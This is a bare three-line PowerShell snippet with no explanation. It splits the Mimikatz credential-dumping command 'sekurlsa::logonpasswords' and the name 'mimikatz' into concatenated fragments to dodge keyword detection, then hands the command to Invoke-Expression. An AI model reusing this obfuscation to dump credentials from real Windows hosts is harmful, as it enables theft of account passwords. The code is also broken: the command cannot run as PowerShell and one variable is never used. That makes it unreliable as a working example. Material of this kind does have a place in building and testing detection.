$a = "sekur" + "lsa::logonpasswords"
$b = "mimi" + "katz"
IEX($a)
